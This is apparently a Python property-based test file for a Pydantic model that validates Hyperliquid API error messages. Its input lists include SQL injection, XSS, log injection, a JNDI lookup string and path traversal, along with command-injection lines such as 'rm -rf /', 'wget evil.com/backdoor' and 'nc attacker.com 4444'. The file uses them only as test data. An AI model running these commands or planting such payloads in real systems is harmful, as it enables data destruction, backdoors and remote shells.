"""Property-based tests for Hyperliquid raw API error models.

These tests validate critical security boundary models that process external API error messages.
The models tested here are essential for error handling, debugging, and security incident response.

SECURITY CRITICAL: These raw models protect against:
- Malicious error messages that could manipulate logging systems
- Buffer overflow attacks through oversized error strings
- Injection attacks through malformed error content
- Log injection that could compromise monitoring systems
- Unicode attacks through invalid error message encoding
- Information leakage through crafted error responses

Property testing ensures comprehensive coverage of error edge cases and adversarial inputs.
"""

import json
from typing import Any

import pytest
from hypothesis import given, strategies as st, assume
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.hyperliquid.models.hl_raw_api_error import HyperliquidRawApiError
from cyberdelta.exceptions.field_validation import TypeFieldError
from cyberdelta.exceptions.parsing import EmptyStringError


# =============================================================================
# HYPOTHESIS STRATEGIES FOR API ERROR MODEL TESTING
# =============================================================================


def valid_error_message_strategy() -> SearchStrategy[str]:
    """Generate valid error message strings."""
    return st.one_of([
        # Common error messages
        st.sampled_from([
            "Something went wrong",
            "Order not found",
            "INSUFFICIENT_FUNDS",
            "INVALID_SIGNATURE",
            "Too Many Requests",
            "SERVER_ERROR",
            "Unauthorized",
            "ResourceNotFound",
            "Internal server error",
            "Bad request",
            "Forbidden",
            "Service unavailable",
            "Timeout",
            "Rate limit exceeded",
        ]),
        # Generated error messages
        st.text(
            min_size=1,
            max_size=1024,
            alphabet=st.characters(
                blacklist_categories=["Cs"],  # Exclude surrogates
                min_codepoint=1,  # Exclude null character
            ),
        ).filter(lambda x: x.strip()),
        # SQL injection patterns (should be accepted as valid strings)
        st.sampled_from([
            "' OR 1=1 --",
            "'; DROP TABLE users;--",
            "SELECT * FROM errors WHERE msg='fail'",
            "UNION SELECT * FROM sensitive_data",
            "1' AND SLEEP(5)--",
        ]),
        # XSS patterns (should be accepted as valid strings)
        st.sampled_from([
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(document.cookie)>",
            "javascript:alert('xss')",
            "<svg onload=alert(1)>",
            "<iframe src=\"javascript:alert('xss')\"></iframe>",
        ]),
        # Log injection patterns
        st.sampled_from([
            "error\n[INFO] Fake log entry",
            "error\r\n[ADMIN] Unauthorized access",
            "error\x00null byte",
            "error\\nFake entry",
        ]),
        # Command injection patterns
        st.sampled_from([
            "error; rm -rf /",
            "error && wget evil.com/backdoor",
            "error | nc attacker.com 4444",
            "error `curl evil.com`",
            "error $(whoami)",
        ]),
        # Format string patterns
        st.sampled_from([
            "error %s %s %s %n",
            "error %x %x %x",
            "error %08x %08x",
            "error {0} {1} {2}",
        ]),
        # JSON-like strings
        st.sampled_from([
            '{"error": "fail"}',
            '["fail", "error"]',
            "{error: true}",
            '{\n  "error": "fail"\n}',
            "[1, 2, 3]",
        ]),
        # Unicode edge cases
        st.sampled_from([
            "e\u0301rror",  # e + combining acute accent
            "\u202eerror",  # Right-to-left override
            "e\u200derror",  # Zero-width joiner
            "\u202aerror\u202c",  # Left-to-right embedding
            "error \u2603",  # snowman
            "error \U0001d11e",  # musical symbol G clef
            "error \u200b",  # zero-width space
            "error\u200e",  # left-to-right mark
            "error\u200f",  # right-to-left mark
            "error\u2060",  # word joiner
        ]),
        # Emoji sequences
        st.sampled_from([
            "error 👨🏽‍💻",  # man technologist: medium skin tone
            "error 👩‍🔬",  # woman scientist
            "error 🏳️‍🌈",  # rainbow flag
            "error 👨‍👩‍👧‍👦",  # family emoji
            "error \U0001f4a9",  # pile of poo
            "error \U0001f600",  # grinning face
            "error \U0001f9d1\U0001f3fb",  # person: light skin tone
        ]),
        # Mixed language scripts
        st.sampled_from([
            "Ошибка: error",  # Russian + English
            "خطأ: error",  # Arabic + English
            "error 错误",  # English + Chinese
            "エラー: error",  # Japanese + English
        ]),
        # Control characters and line breaks
        st.sampled_from([
            "error\nmessage",
            "error\tmessage",
            "error\x07bell",
            "error\r\nnextline",
            "error\rmessage",
            "error\r\nmessage",
            "error\n\rmessage",
        ]),
        # Bidirectional text
        st.sampled_from([
            "error \u202etxet detcerid-ot-thgir",  # RLO
            "\u202berror\u202c",  # RLE ... PDF
        ]),
        # Edge cases
        st.sampled_from([
            "e",  # Single character
            " e",  # Whitespace + char
            "e ",  # Char + whitespace
            "\te",  # Tab + char
            "e\n",  # Char + newline
            "!!!",  # Only symbols
            "???",  # Only punctuation
            "@#$%^&*()",  # Special characters
            "-=~`|{}[]",  # Brackets and symbols
            "•••••",  # Bullet points
            "0",
            "1",
            "1234567890",  # Number-like strings
            "true",
            "false",
            "null",
            "None",
            "NaN",  # Boolean-like strings
            "   error   ",  # Excessive whitespace
            "error    message",  # Multiple spaces
            "error\t\tmessage",  # Multiple tabs
            "error\n\nmessage",  # Multiple newlines
            "error\r\n\r\nmessage",  # Multiple CRLF
        ]),
        # Escape sequences
        st.sampled_from([
            "error\\nnewline",
            "error\\t tab",
            "error\\u2603 snowman",
        ]),
        # Long repeated patterns (under 1024 chars)
        st.just("error" * 200),  # 1000 chars
        st.just("A" * 1024),  # Max length
    ])


@st.composite
def valid_api_error_data(draw: st.DrawFn) -> dict[str, str]:
    """Generate valid API error data."""
    return {"error": draw(valid_error_message_strategy())}


def malicious_error_strategy() -> SearchStrategy[Any]:
    """Generate malicious values for API error security testing."""
    return st.one_of([
        # Type confusion attacks
        st.integers(),
        st.floats(),
        st.booleans(),
        st.none(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
        # Empty/whitespace (should be rejected)
        st.just(""),
        st.just("   "),
        st.just("\t\t"),
        st.just("\n\n"),
        # Buffer overflow attempts
        st.text(min_size=1025, max_size=10000),
        st.just("A" * 2048),
        st.just("B" * 10000),
        # Invalid UTF-8 sequences (surrogates)
        st.just("bad\udce2\udc28\udc00"),
        st.just("\udcff\udcfe"),
        # Null bytes and control sequences
        st.just("error\x00null"),
        st.just("\x00\x01\x02"),
        # LDAP injection
        st.just("${jndi:ldap://evil.com/exploit}"),
        # Path traversal
        st.just("../../etc/passwd"),
        # NoSQL injection
        st.just("'; return db.errors.find(); //"),
        # JSON injection
        st.just('{"$where": "this.msg.length > 1000"}'),
    ])


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW API ERROR MODEL
# =============================================================================


class TestHyperliquidRawApiErrorProperties:
    """Property-based tests for API error validation and security."""

    @given(error_data=valid_api_error_data())
    def test_api_error_validation_success_properties(self, error_data: dict[str, str]) -> None:
        """Property: Valid API error data should always create valid error objects."""
        # Skip invalid data
        error_msg = error_data["error"]
        assume(isinstance(error_msg, str) and error_msg.strip())
        assume(len(error_msg.encode("utf-8")) <= 1024)

        # Check for invalid surrogates
        try:
            error_msg.encode("utf-8")
        except UnicodeEncodeError:
            assume(False)

        obj = HyperliquidRawApiError.model_validate(error_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawApiError)
        assert obj.error == error_data["error"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(malicious_error=malicious_error_strategy())
    def test_api_error_security_boundary_properties(self, malicious_error: Any) -> None:
        """Property: API error should reject malicious inputs safely."""
        error_data = {"error": malicious_error}

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawApiError.model_validate(error_data)

    @given(error_message=st.text(min_size=1, max_size=1024).filter(lambda x: x.strip()))
    def test_api_error_adversarial_strings_acceptance_properties(self, error_message: str) -> None:
        """Property: Valid adversarial strings should be accepted (they're structurally valid)."""
        # Skip strings with surrogates
        try:
            error_message.encode("utf-8")
        except UnicodeEncodeError:
            assume(False)

        # Skip strings that are too long
        assume(len(error_message.encode("utf-8")) <= 1024)

        error_data = {"error": error_message}
        obj = HyperliquidRawApiError.model_validate(error_data)

        # Property: Adversarial but valid strings should be accepted
        assert obj.error == error_message

    @given(invalid_error_length=st.integers(min_value=1025, max_value=10000))
    def test_api_error_length_validation_properties(self, invalid_error_length: int) -> None:
        """Property: API error should reject messages exceeding length limits."""
        error_message = "A" * invalid_error_length
        error_data = {"error": error_message}

        # Property: Oversized messages should be rejected
        with pytest.raises((ValidationError, TypeFieldError)):
            HyperliquidRawApiError.model_validate(error_data)

    @given(
        invalid_error_type=st.one_of([
            st.integers(),
            st.floats(),
            st.booleans(),
            st.none(),
            st.lists(st.text()),
            st.dictionaries(st.text(), st.text()),
        ])
    )
    def test_api_error_type_validation_properties(self, invalid_error_type: Any) -> None:
        """Property: API error should reject non-string error values."""
        error_data = {"error": invalid_error_type}

        # Property: Non-string types should be rejected
        with pytest.raises((ValidationError, TypeFieldError)):
            HyperliquidRawApiError.model_validate(error_data)

    def test_api_error_missing_field_properties(self) -> None:
        """Property: API error should require the error field."""
        error_data: dict[str, str] = {}

        # Property: Missing error field should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawApiError.model_validate(error_data)

    @given(
        extra_fields=st.dictionaries(
            st.text(min_size=1, max_size=20),
            st.text(min_size=1, max_size=20),
            min_size=1,
            max_size=5,
        )
    )
    def test_api_error_extra_fields_properties(self, extra_fields: dict[str, str]) -> None:
        """Property: API error should forbid extra fields."""
        error_data = {"error": "Something went wrong"}
        error_data.update(extra_fields)

        # Property: Extra fields should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawApiError.model_validate(error_data)

    @given(
        whitespace_error=st.one_of([
            st.just(""),
            st.just("   "),
            st.just("\t\t"),
            st.just("\n\n"),
            st.just("\r\r"),
            st.just("  \t  \n  "),
        ])
    )
    def test_api_error_whitespace_validation_properties(self, whitespace_error: str) -> None:
        """Property: API error should reject empty or whitespace-only messages."""
        error_data = {"error": whitespace_error}

        # Property: Empty/whitespace-only messages should be rejected
        with pytest.raises(EmptyStringError):
            HyperliquidRawApiError.model_validate(error_data)

    @given(error_data=valid_api_error_data())
    def test_api_error_json_serialization_properties(self, error_data: dict[str, str]) -> None:
        """Property: API error should maintain JSON serialization compatibility."""
        # Skip invalid data
        error_msg = error_data["error"]
        assume(isinstance(error_msg, str) and error_msg.strip())
        assume(len(error_msg.encode("utf-8")) <= 1024)

        try:
            error_msg.encode("utf-8")
        except UnicodeEncodeError:
            assume(False)

        obj = HyperliquidRawApiError.model_validate(error_data)
        json_str = obj.model_dump_json()
        parsed_json = json.loads(json_str)

        # Property: Should be able to reconstruct from JSON
        reconstructed = HyperliquidRawApiError.model_validate(parsed_json)
        assert reconstructed.error == obj.error


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_HyperliquidRawApiError_happy_path() -> None:
    """Test happy path validation."""
    error_data = {"error": "Something went wrong"}
    obj = HyperliquidRawApiError.model_validate(error_data)
    assert obj.error == "Something went wrong"


def test_HyperliquidRawApiError_missing_error_field() -> None:
    """Test validation fails for missing error field."""
    with pytest.raises(ValidationError):
        HyperliquidRawApiError.model_validate({})


def test_HyperliquidRawApiError_type_errors() -> None:
    """Test validation fails for wrong types."""
    for bad in [123, 1.5, True, None, ["err"], {"msg": "err"}]:
        with pytest.raises(TypeFieldError):
            HyperliquidRawApiError.model_validate({"error": bad})


def test_HyperliquidRawApiError_empty_and_whitespace() -> None:
    """Test validation fails for empty/whitespace strings."""
    for bad in ["", "   "]:
        with pytest.raises(EmptyStringError):
            HyperliquidRawApiError.model_validate({"error": bad})


def test_HyperliquidRawApiError_too_long() -> None:
    """Test validation fails for oversized messages."""
    msg = "a" * 1025
    with pytest.raises(TypeFieldError):
        HyperliquidRawApiError.model_validate({"error": msg})


def test_HyperliquidRawApiError_invalid_utf8() -> None:
    """Test validation fails for invalid UTF-8."""
    bad = "bad\udce2\udc28\udc00"
    with pytest.raises(TypeFieldError):
        HyperliquidRawApiError.model_validate({"error": bad})


def test_HyperliquidRawApiError_extra_field() -> None:
    """Test validation fails with extra fields."""
    error_data = {"error": "Something went wrong", "extra": "field"}
    with pytest.raises(ValidationError):
        HyperliquidRawApiError.model_validate(error_data)


def test_HyperliquidRawApiError_adversarial_strings_acceptance() -> None:
    """Test that adversarial but valid strings are accepted."""
    # These are structurally valid and must be accepted
    for s in [
        "' OR 1=1 --",
        "<script>alert(1)</script>",
        "💣",
        "error: DROP TABLE users;",
        "SELECT * FROM errors WHERE msg='fail'",
    ]:
        obj = HyperliquidRawApiError.model_validate({"error": s})
        assert obj.error == s


def test_HyperliquidRawApiError_json_like_strings() -> None:
    """Test acceptance of JSON-like strings."""
    for s in [
        '{"error": "fail"}',
        '["fail", "error"]',
        "{error: true}",
        '{\n  "error": "fail"\n}',
        "[1, 2, 3]",
    ]:
        obj = HyperliquidRawApiError.model_validate({"error": s})
        assert obj.error == s


def test_HyperliquidRawApiError_unicode_edge_cases() -> None:
    """Test acceptance of unicode edge cases."""
    for s in [
        "e\u0301rror",  # e + combining acute accent
        "\u202eerror",  # Right-to-left override
        "e\u200derror",  # Zero-width joiner
        "\u202aerror\u202c",  # Left-to-right embedding
    ]:
        obj = HyperliquidRawApiError.model_validate({"error": s})
        assert obj.error == s


def test_HyperliquidRawApiError_control_characters() -> None:
    """Test acceptance of control characters."""
    for s in [
        "error\nmessage",
        "error\tmessage",
        "error\x07bell",
        "error\r\nnextline",
    ]:
        obj = HyperliquidRawApiError.model_validate({"error": s})
        assert obj.error == s


def test_HyperliquidRawApiError_emoji_sequences() -> None:
    """Test acceptance of emoji sequences."""
    for s in [
        "error 👨🏽‍💻",  # man technologist: medium skin tone
        "error 👩‍🔬",  # woman scientist
        "error 🏳️‍🌈",  # rainbow flag
        "error 👨‍👩‍👧‍👦",  # family emoji
    ]:
        obj = HyperliquidRawApiError.model_validate({"error": s})
        assert obj.error == s


def test_HyperliquidRawApiError_mixed_language_scripts() -> None:
    """Test acceptance of mixed language scripts."""
    for s in [
        "Ошибка: error",  # Russian + English
        "خطأ: error",  # Arabic + English
        "error 错误",  # English + Chinese
        "エラー: error",  # Japanese + English
    ]:
        obj = HyperliquidRawApiError.model_validate({"error": s})
        assert obj.error == s


def test_HyperliquidRawApiError_long_repeated_pattern() -> None:
    """Test acceptance of long repeated patterns."""
    s = "error" * 200  # 1000 chars
    obj = HyperliquidRawApiError.model_validate({"error": s})
    assert obj.error == s
